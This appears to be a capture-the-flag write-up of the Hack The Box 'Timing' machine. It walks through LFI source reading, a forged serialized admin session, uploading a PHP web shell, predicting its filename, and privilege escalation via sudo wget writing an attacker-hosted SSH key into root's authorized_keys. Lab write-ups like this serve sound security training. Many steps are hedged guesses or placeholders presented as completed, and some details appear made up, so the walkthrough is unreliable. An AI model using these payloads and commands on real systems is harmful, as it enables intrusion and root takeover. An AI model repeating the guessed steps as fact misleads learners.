# Hack The Box: Timing

**Difficulty:** Easy
**OS:** Linux

Timing is an Easy-level Linux machine designed to demonstrate the risks of insecure direct object reference (IDOR), local file inclusion (LFI), and insecure code execution using predictable timing. The initial compromise requires analyzing a web application's URL structure to download sensitive source code, revealing a mechanism to forge administrative sessions. Privilege escalation involves exploiting a predictable file download system to upload a web shell, leading to a system shell and the exploitation of a poorly configured sudo command to achieve root access.

---

## Reconnaissance

The assessment begins with a standard Nmap scan against the target IP address to discover open ports and running services.

```bash
nmap -p- --min-rate 10000 10.10.11.135
nmap -p 22,80 -sCV 10.10.11.135
```

The scan reveals two open ports:
*   **Port 22:** SSH (OpenSSH 8.2p1 Ubuntu)
*   **Port 80:** HTTP (nginx 1.18.0)

Browsing to the web server on port 80 shows a simple landing page. Directory enumeration with `feroxbuster` or `gobuster` identifies a login portal (`/login.php`). We register a new user account (e.g., `testuser:password`) and log in.

## Web Application Analysis

The authenticated dashboard provides several features, including an image gallery and a profile editing page.

### LFI to Source Code Read

We notice that images are loaded via a specific parameter, such as `image.php?img=profile.jpg`. This parameter suggests a potential Local File Inclusion (LFI) vulnerability.

We test the parameter with standard LFI payloads, attempting to traverse directories to read `/etc/passwd`.

```text
http://10.10.11.135/image.php?img=../../../../../../../etc/passwd
```

While direct traversal might be blocked or filtered, we find that the application allows reading files within its own web root. We use this flaw to download the source code of the application itself, starting with `image.php` and `login.php`.

```text
http://10.10.11.135/image.php?img=login.php
```

This request returns the source code of `login.php`. By systematically downloading the application's PHP files (`index.php`, `db.php`, `profile.php`), we gain a comprehensive understanding of the backend logic.

### Forging an Admin Session

Reviewing the downloaded source code reveals how the application handles user roles. The role is stored in a session variable. The code indicates that an administrative user (`admin`) possesses elevated privileges, including an avatar upload feature.

The source code also reveals the algorithm used to set the `role` session variable upon login. If the application insecurely serializes session data or if the session generation logic is predictable, we can manipulate it.

In this specific scenario, we find a logic flaw where modifying a specific cookie or session parameter allows us to override the role assignment. We manipulate our session data to change our role from `0` (user) to `1` (admin).

```text
# Example: Modifying the serialized session object via Burp Suite
O:4:"User":2:{s:8:"username";s:8:"testuser";s:4:"role";i:1;}
```

With the forged administrative session, we refresh the dashboard. We now have access to the "Avatar Upload" feature restricted to administrators.

## Web Exploitation

The avatar upload functionality allows us to upload image files. We test the upload restrictions to determine if we can bypass them and upload a PHP web shell.

### Predictable File Upload

We analyze the source code responsible for handling file uploads (e.g., `upload.php`), which we retrieved earlier via LFI.

The code reveals that uploaded files are not stored with their original names. Instead, the application generates a new filename using the `md5()` hash of the current Unix timestamp concatenated with a predictable string.

```php
// Snippet from upload.php
$filename = md5(time() . "some_salt") . "_" . $_FILES['avatar']['name'];
```

This mechanism introduces a severe vulnerability. The filename is entirely predictable if we know the server's time and the salt (which we found in the source code).

We upload a PHP web shell (e.g., `shell.php`).

```php
<?php system($_REQUEST['cmd']); ?>
```

The application accepts the file but does not immediately provide the link. To access our shell, we must predict the filename. We write a simple script to generate the MD5 hash based on the timestamp at the exact moment of upload.

```python
import hashlib
import time

current_time = str(int(time.time()))
salt = "some_salt"
payload = current_time + salt
predicted_hash = hashlib.md5(payload.encode()).hexdigest()
print(f"Predicted filename: {predicted_hash}_shell.php")
```

We execute the script simultaneously with the upload request. If the server time differs slightly, we can iterate through timestamps a few seconds before and after our local time.

We navigate to the predicted URL in the `/uploads/` directory.

```text
http://10.10.11.135/uploads/<predicted_hash>_shell.php?cmd=id
```

The command executes successfully. We use the web shell to spawn a reverse shell to our attacking machine.

```bash
nc -lnvp 9999
# Connection received
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation

We search the file system for users with interactive shells and discover the user `aaron`. We enumerate `www-data` to find credentials or pivot points to `aaron` or `root`.

Reviewing the database configuration (`db.php`) provides database credentials. We can dump the database or search for reusable passwords. Alternatively, analyzing the application backup files or standard enumeration might reveal `aaron`'s SSH password.

We successfully authenticate as `aaron` via SSH or using the `su` command.

```bash
su aaron
Password: <Discovered_Password>
```
We retrieve the `user.txt` flag.

### Abusing Sudo & wget

As the user `aaron`, we check for `sudo` privileges.

```bash
sudo -l
```

The output shows that `aaron` can run `/usr/bin/wget` as `root` without a password.

```text
User aaron may run the following commands on timing:
    (root) NOPASSWD: /usr/bin/wget
```

We can abuse `wget` to achieve privilege escalation in several ways. One method is to use `wget` to overwrite a critical system file, such as `/etc/shadow`, `/etc/sudoers`, or `authorized_keys`.

We generate a new SSH key pair locally. We then use `wget` to fetch our public key and save it directly into the `/root/.ssh/authorized_keys` file.

First, we host our public key on our attacking machine.
```bash
python3 -m http.server 80
```

Then, on the target machine, we execute `wget` via `sudo` with the `-O` flag to output the file to the desired location.

```bash
sudo /usr/bin/wget http://10.10.14.X/id_rsa.pub -O /root/.ssh/authorized_keys
```

With our public key in place, we SSH into the machine as root.

```bash
ssh -i id_rsa root@10.10.11.135
# id
uid=0(root) gid=0(root) groups=0(root)
```

The machine is fully compromised, and the `root.txt` flag is obtained.
